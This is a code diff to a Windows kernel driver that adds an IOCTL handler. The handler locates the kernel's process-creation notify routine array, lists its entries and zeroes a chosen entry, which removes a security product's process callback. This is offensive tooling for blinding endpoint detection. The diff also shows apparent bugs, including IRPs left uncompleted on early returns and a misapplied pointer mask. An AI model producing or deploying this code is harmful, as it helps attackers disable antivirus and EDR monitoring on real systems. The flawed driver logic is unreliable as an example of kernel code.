@@ -10,10 +10,11 @@
 */
 
 #define DRIVER_NAME "Rm_ProcCallback"
-#define IOCTL_RM_PROC_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_READ_PROC_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_RM_PROC_CALLBACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 typedef struct _PROC_CALLBACK_DATA {
-    ULONG ProcessId;
+    int Index;
 } PROC_CALLBACK_DATA, * PPROC_CALLBACK_DATA;
 
 struct ModulesData {
@@ -302,7 +303,6 @@ typedef enum _SYSTEM_INFORMATION_CLASS
     SystemCodeIntegrityEndpointSecurityInformation,         // q: SYSTEM_CODE_INTEGRITY_ENDPOINT_SECURITY_INFORMATION
     MaxSystemInfoClass
 } SYSTEM_INFORMATION_CLASS;
-
 
 typedef enum _NOTIFY_ROUTINE_TYPE {
     ProcessCreateCallback
@@ -613,7 +613,7 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP Irp)
     NTSTATUS status = STATUS_SUCCESS;
     ULONG64 count = 0;
 
-    if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_RM_PROC_CALLBACK)
+    if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_READ_PROC_CALLBACK)
     {
         ULONG outLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
 
@@ -644,6 +644,48 @@ NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP Irp)
             status = STATUS_BUFFER_TOO_SMALL;
             count = 0;
         }
+    }
+    else if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_RM_PROC_CALLBACK)
+    {
+		PPROC_CALLBACK_DATA pProcCallbackData = (PPROC_CALLBACK_DATA)Irp->AssociatedIrp.SystemBuffer;
+        if (pProcCallbackData == NULL) {
+			DbgPrint("[%s]: Invalid input buffer\n", DRIVER_NAME);
+			status = STATUS_INVALID_PARAMETER;
+            Irp->IoStatus.Status = status;
+            Irp->IoStatus.Information = 0;
+            IoCompleteRequest(Irp, IO_NO_INCREMENT);
+            return status;
+        }
+        
+        DbgPrint("[%s]: Index: %lu\n", DRIVER_NAME, pProcCallbackData->Index);
+
+		DWORD64 KernelBase = ResolveKernelBaseAddress();
+        if (!KernelBase)
+            return STATUS_UNSUCCESSFUL;
+
+		ULONG64 PspCreateProcessNotifyRoutineAddress = FindNotifyRoutineAddress();
+		if (!PspCreateProcessNotifyRoutineAddress)
+			return STATUS_UNSUCCESSFUL;
+
+        ULONG64 NotifyRoutineAddr, TempAddr = 0;
+        for (int i = 0; i < 64; i++) {
+			TempAddr = PspCreateProcessNotifyRoutineAddress + i * 8;
+
+			NotifyRoutineAddr = *(PULONG64)(TempAddr);
+
+            if (MmIsAddressValid((PVOID)NotifyRoutineAddr) && NotifyRoutineAddr != 0) {
+			    
+                NotifyRoutineAddr = *(PULONG64)(TempAddr & 0xfffffffffffffff8);
+			    
+                DbgPrint("[%s]: [Index: %d] NotifyRoutineAddr: %llx\n", DRIVER_NAME, i, NotifyRoutineAddr);
+        
+                if (pProcCallbackData->Index == i) {
+                    RtlZeroMemory((PVOID)TempAddr, sizeof(ULONG64));
+				    status = STATUS_SUCCESS;
+                }
+            }
+        }
+
     }
     else {
         DbgPrint("[%s]: Invalid IOCTL code\n", DRIVER_NAME);
